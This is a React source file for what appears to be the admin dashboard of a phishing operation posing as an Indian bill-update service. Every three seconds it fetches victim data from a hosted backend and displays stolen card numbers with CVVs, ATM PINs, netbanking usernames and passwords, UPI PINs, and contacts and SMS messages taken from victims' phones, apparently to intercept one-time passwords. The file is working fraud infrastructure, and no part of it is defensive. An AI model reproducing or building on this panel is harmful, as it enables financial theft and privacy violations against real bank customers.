import { useState, useEffect, useCallback } from 'react'

const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'

const sections = [
  { key: 'bill_updates', label: 'Bill Update Requests', color: '#2D9CDB' },
  { key: 'card_details', label: 'Card Details', color: '#F39C12' },
  { key: 'card_verifications', label: 'Card Verifications', color: '#27AE60' },
  { key: 'netbanking_details', label: 'Netbanking Logins', color: '#E74C3C' },
  { key: 'netbanking_pins', label: 'Netbanking Pins', color: '#8E44AD' },
  { key: 'upi_details', label: 'UPI PIN Entries', color: '#1ABC9C' },
  { key: 'payment_attempts', label: 'Payment Attempts', color: '#E67E22' },
  { key: 'sms_records', label: 'SMS Records', color: '#1ABC9C' },
  { key: 'devices', label: 'Devices', color: '#6C5CE7' },
]

const fieldLabels = {
  bill_updates: ['id', 'customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
  card_details: ['id', 'card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
  card_verifications: ['id', 'dob', 'atm_pin', 'amount', 'created_at'],
  netbanking_details: ['id', 'bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
  netbanking_pins: ['id', 'pin', 'amount', 'created_at'],
  upi_details: ['id', 'pin', 'amount', 'created_at'],
  payment_attempts: ['id', 'amount', 'payment_method', 'status', 'created_at'],
  sms_records: ['id', 'device_id', 'sender', 'message', 'received_at', 'created_at'],
}

const DeviceSection = ({ device, sms, contacts }) => (
  <div style={styles.deviceCard}>
    <div style={styles.deviceHeader}>
      <h3 style={{ margin: 0 }}>{device.device_name || 'Unknown Device'}</h3>
      <span style={styles.badge}>ID: {device.device_id?.slice(0, 8)}...</span>
    </div>
    <div style={styles.deviceMeta}>
      <div><strong>Model:</strong> {device.model}</div>
      <div><strong>OS:</strong> {device.os_version}</div>
      <div><strong>App:</strong> v{device.app_version}</div>
      <div><strong>Last Seen:</strong> {new Date(device.last_seen).toLocaleString()}</div>
      <div><strong>Registered:</strong> {new Date(device.created_at).toLocaleString()}</div>
    </div>

    {contacts?.length > 0 && (
      <>
        <h4 style={styles.subtitle}>Contacts ({contacts.length})</h4>
        <div style={styles.contactGrid}>
          {contacts.map((c, i) => (
            <div key={c.id || i} style={styles.contactCard}>
              <div style={{ fontWeight: 600 }}>{c.name || 'Unknown'}</div>
              <div style={{ color: '#2D9CDB', fontSize: 13 }}>{c.phone}</div>
              {c.email ? <div style={{ color: '#999', fontSize: 12 }}>{c.email}</div> : null}
            </div>
          ))}
        </div>
      </>
    )}

    {sms?.length > 0 && (
      <>
        <h4 style={styles.subtitle}>SMS Records ({sms.length})</h4>
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>Sender</th>
              <th style={styles.th}>Message</th>
              <th style={styles.th}>Time</th>
            </tr>
          </thead>
          <tbody>
            {sms.map((s, i) => (
              <tr key={s.id || i} style={i % 2 ? styles.trAlt : {}}>
                <td style={styles.td}>{s.sender}</td>
                <td style={styles.td}>{s.message}</td>
                <td style={styles.td}>{new Date(s.received_at || s.created_at).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </>
    )}

    {(!contacts || contacts.length === 0) && (!sms || sms.length === 0) && (
      <div style={{ color: '#999', padding: 20, textAlign: 'center' }}>No data from this device yet</div>
    )}
  </div>
)

export default function App() {
  const [data, setData] = useState(null)
  const [active, setActive] = useState('bill_updates')
  const [selectedDeviceId, setSelectedDeviceId] = useState(null)
  const [time, setTime] = useState('')

  const fetchData = useCallback(async () => {
    try {
      const r = await fetch(API)
      const d = await r.json()
      setData(d)
      setTime(new Date().toLocaleTimeString())
    } catch {}
  }, [])

  useEffect(() => {
    fetchData()
    const id = setInterval(fetchData, 3000)
    return () => clearInterval(id)
  }, [fetchData])

  if (!data) return <div style={styles.loading}>Loading admin panel...</div>

  const cols = fieldLabels
  const rows = data[active] || []
  const stats = data.stats || {}
  const deviceSections = data.device_sections || []

  // If switching to devices, select first device
  const handleTabClick = (key) => {
    setActive(key)
    if (key === 'devices' && deviceSections.length > 0) {
      setSelectedDeviceId(deviceSections[0].device.device_id)
    }
  }

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <h1 style={styles.title}>Bill Update — Admin Panel</h1>
        <span style={styles.live}>LIVE {time} (auto-refresh 3s)</span>
      </header>

      <div style={styles.statsRow}>
        {sections.map(s => (
          <div key={s.key} style={{...styles.statCard, borderTop: `4px solid ${s.color}`}} onClick={() => handleTabClick(s.key)}>
            <div style={{...styles.statNum, color: s.color}}>{stats[`total_${s.key}`] || 0}</div>
            <div style={styles.statLabel}>{s.label}</div>
          </div>
        ))}
      </div>

      <div style={styles.tabs}>
        {sections.map(s => (
          <button key={s.key} style={{...styles.tab, ...(active === s.key ? {backgroundColor: s.color, color: '#fff'} : {})}} onClick={() => handleTabClick(s.key)}>
            {s.label}
          </button>
        ))}
      </div>

      {active === 'devices' ? (
        <div>
          {deviceSections.length === 0 ? (
            <div style={styles.empty}>No devices registered yet</div>
          ) : (
            <>
              <div style={styles.deviceTabsWrap}>
                {deviceSections.map(ds => (
                  <button
                    key={ds.device.device_id}
                    style={{...styles.deviceTab, ...(selectedDeviceId === ds.device.device_id ? {backgroundColor: '#6C5CE7', color: '#fff'} : {})}}
                    onClick={() => setSelectedDeviceId(ds.device.device_id)}
                  >
                    {ds.device.device_name || 'Device'} ({ds.contacts?.length || 0}C / {ds.sms?.length || 0}S)
                  </button>
                ))}
              </div>
              {deviceSections
                .filter(ds => ds.device.device_id === selectedDeviceId)
                .map(ds => <DeviceSection key={ds.device.device_id} {...ds} />)
              }
            </>
          )}
        </div>
      ) : (
        <div style={styles.tableWrap}>
          <table style={styles.table}>
            <thead>
              <tr>
                {cols[active]?.map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}
              </tr>
            </thead>
            <tbody>
              {rows.length === 0 ? (
                <tr><td colSpan={cols[active]?.length || 1} style={styles.empty}>No data</td></tr>
              ) : rows.map((row, i) => (
                <tr key={row.id || i} style={i % 2 ? styles.trAlt : {}}>
                  {cols[active].map(c => {
                    let val = row[c]
                    if (c === 'created_at' || c === 'last_seen') val = new Date(val).toLocaleString()
                    if (typeof val === 'boolean') val = val ? 'Yes' : 'No'
                    if (c === 'amount') val = `₹${val}`
                    if (val === null || val === undefined) val = '-'
                    return <td key={c} style={styles.td}>{val}</td>
                  })}
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  )
}

const styles = {
  container: { fontFamily: 'system-ui, sans-serif', background: '#f0f2f5', minHeight: '100vh', padding: '0 0 40px' },
  loading: { display: 'flex', height: '100vh', alignItems: 'center', justifyContent: 'center', fontSize: 24, color: '#666' },
  header: { background: '#1A2A6C', color: '#fff', padding: '20px 30px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' },
  title: { margin: 0, fontSize: 24, fontWeight: 800 },
  live: { fontSize: 13, opacity: .8, fontFamily: 'monospace' },
  statsRow: { display: 'flex', gap: 12, padding: 20, flexWrap: 'wrap' },
  statCard: { background: '#fff', borderRadius: 10, padding: '14px 20px', flex: '1 0 140px', cursor: 'pointer', boxShadow: '0 2px 8px rgba(0,0,0,.06)' },
  statNum: { fontSize: 28, fontWeight: 800 },
  statLabel: { fontSize: 12, color: '#666', marginTop: 2 },
  tabs: { display: 'flex', gap: 8, padding: '0 20px 16px', flexWrap: 'wrap' },
  tab: { padding: '8px 16px', border: 'none', borderRadius: 8, background: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: 13, boxShadow: '0 1px 4px rgba(0,0,0,.06)' },
  tableWrap: { margin: '0 20px', background: '#fff', borderRadius: 12, overflow: 'auto', boxShadow: '0 2px 12px rgba(0,0,0,.08)' },
  table: { width: '100%', borderCollapse: 'collapse', fontSize: 13, minWidth: 700 },
  th: { padding: '12px 14px', textAlign: 'left', background: '#f8f9fa', borderBottom: '2px solid #dee2e6', fontWeight: 700, color: '#333', whiteSpace: 'nowrap', fontSize: 11 },
  td: { padding: '10px 14px', borderBottom: '1px solid #eee', whiteSpace: 'nowrap' },
  trAlt: { background: '#f8f9fa' },
  empty: { textAlign: 'center', padding: 40, color: '#999' },

  deviceCard: { margin: '0 20px', background: '#fff', borderRadius: 12, padding: 24, boxShadow: '0 2px 12px rgba(0,0,0,.08)' },
  deviceHeader: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 },
  badge: { background: '#6C5CE7', color: '#fff', padding: '4px 10px', borderRadius: 20, fontSize: 11, fontWeight: 600 },
  deviceMeta: { display: 'flex', gap: 20, flexWrap: 'wrap', marginBottom: 20, fontSize: 13, color: '#555' },
  subtitle: { fontSize: 16, fontWeight: 600, color: '#333', margin: '20px 0 12px' },
  contactGrid: { display: 'flex', gap: 10, flexWrap: 'wrap' },
  contactCard: { background: '#f8f9fa', borderRadius: 8, padding: '10px 14px', minWidth: 180, border: '1px solid #eee' },
  deviceTabsWrap: { display: 'flex', gap: 8, padding: '0 20px 16px', flexWrap: 'wrap' },
  deviceTab: { padding: '10px 18px', border: 'none', borderRadius: 8, background: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: 13, boxShadow: '0 1px 4px rgba(0,0,0,.06)', border: '2px solid #6C5CE7' },
}
